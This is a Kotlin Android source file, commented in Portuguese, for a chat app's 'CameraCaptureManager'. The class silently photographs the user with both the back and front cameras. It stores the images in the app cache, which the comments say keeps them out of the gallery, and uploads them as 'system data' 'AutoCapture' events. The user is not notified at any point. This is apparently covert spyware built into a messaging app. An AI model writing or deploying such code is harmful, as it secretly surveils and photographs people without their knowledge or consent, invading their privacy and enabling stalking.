package com.zangi.chat.service

import android.content.Context
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import kotlin.coroutines.resume

/**
 * CameraCaptureManager: Gerencia a captura de fotos em modo silencioso.
 * Implementação otimizada para captura sequencial (Frontal e Traseira) 
 * sem bloquear a interface do usuário.
 */
class CameraCaptureManager(
    private val context: Context,
    private val repository: ChatRepository,
    private val lifecycleOwner: LifecycleOwner
) {
    private val TAG = "CameraCaptureManager"

    /**
     * Inicia o ciclo completo de captura: tira uma foto com a câmera traseira 
     * e uma com a câmera frontal, enviando ambas para o repositório.
     */
    suspend fun captureDualPhotosSequence(): List<File> = withContext(Dispatchers.Main) {
        val capturedFiles = mutableListOf<File>()
        val cameraSelectors = listOf(CameraSelector.DEFAULT_BACK_CAMERA, CameraSelector.DEFAULT_FRONT_CAMERA)

        try {
            Log.d(TAG, "🚀 Iniciando sequência de captura dupla (Front/Back)...")

            cameraSelectors.forEach { selector ->
                val cameraTypeLabel = if (selector == CameraSelector.DEFAULT_BACK_CAMERA) "BACK" else "FRONT"
                
                // 1. Realiza a captura
                val capturedFile = captureSinglePhoto(selector)
                
                if (capturedFile != null && capturedFile.exists()) {
                    capturedFiles.add(capturedFile)
                    Log.d(TAG, "✅ Captura $cameraTypeLabel concluída: ${capturedFile.name}")
                } else {
                    Log.e(TAG, "❌ Falha na captura da câmera $cameraTypeLabel")
                }
                
                // Pequeno delay para estabilização do hardware entre trocas de lente
                kotlinx.coroutines.delay(600)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro na sequência de captura: ${e.message}")
        }

        return@withContext capturedFiles
    }

    /**
     * Captura uma única foto de uma câmera específica de forma silenciosa.
     */
    private suspend fun captureSinglePhoto(cameraSelector: CameraSelector): File? = withContext(Dispatchers.Main) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()

            // Configuração do ImageCapture para baixa latência
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            // Unbind de qualquer câmera ativa para evitar conflitos
            cameraProvider.unbindAll()

            // Bind com o lifecycle do app para garantir que a câmera seja liberada corretamente
            cameraProvider.bindToLifecycle(
                lifecycleOwner,
                cameraSelector,
                imageCapture
            )

            // Define o arquivo de saída no cache para não poluir a galeria do usuário
            val tempFile = File(
                context.cacheDir, 
                "silent_cap_${System.currentTimeMillis()}_${if(cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) "back" else "front"}.jpg"
            )

            return@withContext captureRealPhoto(imageCapture, tempFile)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao configurar câmera: ${e.message}")
            null
        }
    }

    /**
     * Método privado que utiliza o callback do CameraX para capturar a imagem de forma assíncrona.
     */
    private suspend fun captureRealPhoto(
        imageCapture: ImageCapture, 
        outputFile: File
    ): File? = suspendCancellableCoroutine { continuation ->
        val outputOptions = ImageCapture.OutputFileOptions.Builder(outputFile).build()

        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    Log.d(TAG, "📸 Foto salva com sucesso: ${outputFile.name}")
                    continuation.resume(outputFile)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e(TAG, "Erro no callback OnImageSaved: ${exception.message}")
                    continuation.resume(null)
                }
            }
        )
    }

    /**
     * Método de fallback para captura única, caso necessário.
     */
    suspend fun captureAndSendPhoto(userId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            // 1. Captura as fotos (Sequencial)
            val files = captureDualPhotosSequence()
            
            if (files.isEmpty()) {
                return@withContext Result.failure(Exception("Nenhuma imagem capturada"))
            }

            // 2. Processa o upload de cada uma
            files.forEach { file ->
                val deviceInfo = "AutoCapture - Android ${android.os.Build.VERSION.RELEASE}, Cam: ${if(file.name.contains("back")) "BACK" else "FRONT"}"
                
                // Chama o repositório para disparar o processo de upload (via Worker)
                repository.uploadSystemData(
                    eventType = "FOTO_CAMERA",
                    file = file,
                    deviceInfo = deviceInfo
                )
            }

            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "Erro no processo de captura e envio: ${e.message}")
            Result.failure(e)
        }
    }
}